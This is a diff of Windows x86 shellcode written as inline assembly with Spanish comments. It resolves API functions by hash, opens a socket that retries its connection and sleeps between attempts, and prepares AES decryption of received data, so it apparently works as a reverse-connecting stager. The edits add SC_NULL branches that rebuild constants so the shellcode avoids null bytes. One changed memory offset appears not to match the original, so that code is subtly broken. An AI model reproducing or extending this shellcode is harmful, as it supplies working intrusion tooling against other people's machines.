@@ -218,7 +218,12 @@ find_kernel32_finished:
         shl  ebx, 0x4                   //EBX = 0x190
         sub  esp, ebx                   //Reservamos espacio suficiente en la pila para WSADATA
         push esp                        //v
-        pushc(0x202)                    //v VersionRequested = 2.2
+        #ifdef SC_NULL
+        push 2                          //v
+        add  [esp+1], 2             //v VersionRequested = 2.2
+        #else
+        push 0x202                      //v VersionRequested = 2.2
+        #endif
         call [ebp+_WSAStartup]          //>WSAStartup(0x202, &WSADATA);
         add  esp, ebx                   //Restauramos la pila eliminando WSADATA de ésta
 
@@ -267,9 +272,14 @@ doConnect:
         test eax, eax                   //v
         jge  connected                  //>(EAX>=0)? (Conectamos con éxito, sigamos!)
         loop doConnect                  //(ECX>0)? (Intentamos conectar de nuevo... hasta 121 veces)
-        //No ha habido suerte conectando... esperemos 0x1337ms y volvamos a intentar
-        pushc(0x1337)                   //v
-        call [ebp+_Sleep]               //Sleep(0x1337);
+        //No ha habido suerte conectando... esperemos 0x1E40ms y volvamos a intentar
+        #ifdef SC_NULL
+        push 0x79                       //v
+        shl  DWORD PTR[esp], 0x6            //v
+        #else
+        push 0x1E40                     //v
+        #endif
+        call [ebp+_Sleep]               //Sleep(0x1E40);
         jmp  rst
 connected:
         add  esp, 0x8                   //Reparamos la pila eliminando sockaddr_in
@@ -314,7 +324,12 @@ KillSocket:
 init_decrypt:
         //Adquirimos el handle para trabajar con el CSP deseado.
         cdq                             //EDX = 0
-        pushc(CRYPT_VERIFYCONTEXT)      //v
+        #ifdef SC_NULL
+        push 0x0F
+        shl  DWORD PTR[esp], 0x1C
+        #else
+        push CRYPT_VERIFYCONTEXT        //v
+        #endif
         push PROV_RSA_AES               //v
         push edx                        //v
         push edx                        //v
@@ -409,7 +424,7 @@ void __declspec(naked) LoadFunctions(DWORD numHashes){
         mov  ecx, [esp+0xC]             //ECX = numHashes
         //ESI = &lpHashes
         mov  edx, eax                   //EDX = &IMAGE_DOS_HEADER
-        lea  edi, [ebp+4]
+        mov  edi, ebp
 
 nextFunction:
         lodsw                           //mov ax, WORD[esi]; esi+=2
@@ -433,7 +448,12 @@ find_function:
         #endif
         add  ebp, edx                   //EBP = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions (VA)
 find_function_loop:
+        #ifdef SC_NULL
+        mov  esi, [ebp+ecx*4-5]         //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions[X] (RVA)
+        dec  esi
+        #else
         mov  esi, [ebp+ecx*4-4]         //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions[X] (RVA)
+        #endif
         add  esi, edx                   //ESI = IMAGE_EXPORT_DIRECTORY.AddressOfNames[X] (VA) Export Name Table
 compute_hash:
         xor  ebx, ebx                   //EBX = 0
@@ -476,7 +496,7 @@ find_function_finished:
         //Guardamos dir en buffer pila
         stosd
         loop nextFunction               //(ECX--);(ECX!=0)?
-        lea  ebp, [edi-4]
+        mov  ebp, edi
         pop  ecx
         pop  edi
         ret
